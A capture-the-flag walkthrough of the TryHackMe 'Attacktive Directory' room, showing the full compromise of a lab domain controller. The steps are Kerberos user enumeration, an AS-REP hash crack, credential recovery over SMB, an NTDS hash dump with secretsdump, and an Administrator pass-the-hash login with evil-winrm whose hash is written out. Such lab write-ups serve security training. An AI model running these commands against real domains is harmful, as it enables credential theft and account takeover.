*2021-09-11*

*kimm3*

# Walkthrough: Attacktive Directory
Platform: TryHackMe

Difficulty: Medium

- [Link](https://tryhackme.com/room/attacktivedirectory)

## Setup
![ll](assets/markdown-img-paste-20210826112245589.png)

```
script history/enum1
export IP=10.10.97.47
```

(Machine responds to ICMP echo)
## Scans and enumeration
`sudo nmap $IP -p- -A -Pn -v -oA scans/nmap-init`

![nmap-init](assets/markdown-img-paste-20210911131108435.png)

That's alot of ports. Looks lik a WS Domain controller.

![index-p80](assets/markdown-img-paste-20210911131237197.png)

Standard IIS page at port 80.

Since kerberos is activated, let's try to enumerate users.

![etchosts](assets/markdown-img-paste-20210911131700561.png)

```
kerbrute userenum --dc AttacktiveDirectory.spookysec.local -d spookysec.local xato-net-10-million-usernames.txt
```

![kerbrute](assets/markdown-img-paste-20210911133732785.png)

(There is one user that dosen't exist in any SecList wordlist, svc-admin. The room provides a custom wordlist for this to make it easier.)

![svc-admin-asrep](assets/markdown-img-paste-20210911134805621.png)

User 'svc-admin' did not have preauth enabled so we got a hash.

![svc-admin-hashcat](assets/markdown-img-paste-20210911134948456.png)

Cracked quite easily. Let's try to connect to smb with this.

![smb-svc-admin](assets/markdown-img-paste-2021091113550025.png)

![smb-backupcredstxt](assets/markdown-img-paste-20210911135542497.png)

We retrive a text file.

![backupcredstxt](assets/markdown-img-paste-20210911135655992.png)

Text file contains encoded credentials to the backup user. If this backup user is used to backup the dc, it has access to the NTDS database and password hashes.

`python3 secretsdump.py spookysec.local/backup:backup2517860@AttacktiveDirectory.spookysec.local -outputfile ../../scans/secretsdump`

## Foothold/Exploit
We don't need to crack these hashes, we just use pass the hash to login.

`evil-winrm -i $IP -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`

![evilwinrm-login](assets/markdown-img-paste-20210911140952672.png)

The flags are at the users desktops.

![flags](assets/markdown-img-paste-20210911141437128.png)
